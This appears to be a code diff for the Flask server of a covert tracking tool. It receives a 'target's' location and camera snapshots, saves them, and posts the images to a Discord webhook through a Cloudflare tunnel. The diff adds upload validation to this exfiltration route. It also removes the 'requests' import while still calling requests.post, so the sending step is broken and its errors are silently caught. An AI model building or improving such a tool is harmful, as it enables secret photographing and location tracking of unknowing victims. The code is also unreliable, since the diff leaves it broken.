@@ -5,10 +5,12 @@ import socket
 import subprocess
 import threading
 import logging
-import requests
 import argparse
 import re
 import time
+import mimetypes
+from pathlib import Path
+from werkzeug.utils import secure_filename
 from flaredantic import FlareTunnel, FlareConfig
 from flask import Flask, request, Response, send_from_directory
 import signal
@@ -18,6 +20,10 @@ from utils import get_file_data, update_webhook, check_and_get_webhook_url
 shutdown_flag = threading.Event()
 
 HTML_FILE_NAME = "index.html"
+DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
+MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
+ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'webp'}
+UPLOAD_FOLDER = 'snapshots'
 
 if sys.stdout.isatty():
     R = '\033[31m'  # Red
@@ -67,18 +73,63 @@ def update_location():
     update_webhook(discord_webhook, data)
     return "OK"
 
+def allowed_file(filename):
+    """Check if the uploaded file has an allowed extension."""
+    return '.' in filename and \
+           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+def validate_file_size(file_obj):
+    """Validate file size."""
+    file_obj.seek(0, os.SEEK_END)
+    file_size = file_obj.tell()
+    file_obj.seek(0)
+    return file_size <= MAX_FILE_SIZE
+
 @app.route('/image', methods=['POST'])
 def image():
-    i = request.files['image']
-    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
-    i.save('%s/%s' % (os.getcwd(), f))
-    #print(f"{B}[+] {C}Picture of the target captured and saved")
-
-    webhook_url = check_and_get_webhook_url(os.getcwd())
-    files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
-    response = requests.post(webhook_url, files=files)
-
-    return Response("%s saved and sent to Discord webhook" % f)
+    try:
+        if 'image' not in request.files:
+            return Response("No image file provided", status=400)
+        
+        file = request.files['image']
+        
+        if file.filename == '':
+            return Response("No file selected", status=400)
+        
+        # Validate file type
+        if not allowed_file(file.filename):
+            return Response("File type not allowed", status=400)
+        
+        # Validate file size
+        if not validate_file_size(file):
+            return Response("File too large", status=400)
+        
+        # Create secure filename
+        filename = secure_filename(file.filename)
+        timestamp = time.strftime("%Y%m%d-%H%M%S")
+        file_extension = filename.rsplit('.', 1)[1].lower()
+        secure_name = f"{timestamp}.{file_extension}"
+        
+        # Ensure upload directory exists
+        upload_path = Path(UPLOAD_FOLDER)
+        upload_path.mkdir(exist_ok=True)
+        
+        # Save file securely
+        file_path = upload_path / secure_name
+        file.save(str(file_path))
+        
+        # Send to Discord webhook
+        webhook_url = check_and_get_webhook_url(os.getcwd())
+        with open(file_path, 'rb') as img_file:
+            files = {'image': img_file}
+            response = requests.post(webhook_url, files=files, timeout=30)
+        
+        logging.info(f"Image saved: {secure_name}")
+        return Response(f"{secure_name} saved and sent to Discord webhook")
+        
+    except Exception as e:
+        logging.error(f"Error processing image: {str(e)}")
+        return Response("Internal server error", status=500)
 
 @app.route('/get_target', methods=['GET'])
 def get_url():
